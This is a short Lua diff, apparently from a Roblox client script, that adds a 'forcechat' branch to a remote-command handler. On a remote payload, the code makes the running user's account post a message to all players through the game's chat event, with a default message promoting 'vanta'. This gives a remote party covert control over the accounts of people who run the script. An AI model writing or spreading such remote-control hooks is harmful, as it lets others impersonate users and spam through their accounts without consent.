@@ -3894,6 +3894,19 @@ local function _handleRemoteCommand(payload)
                     )
             end)
         end)
+
+    elseif cmd == "forcechat" then
+        pcall(function()
+            local msg = tostring(payload.message or "i love vanta so much")
+            local chatEvent = game:GetService("ReplicatedStorage")
+                :FindFirstChild("DefaultChatSystemChatEvents")
+            if chatEvent then
+                local sayMsg = chatEvent:FindFirstChild("SayMessageRequest")
+                if sayMsg then
+                    sayMsg:FireServer(msg, "All")
+                end
+            end
+        end)
     end
 end
 
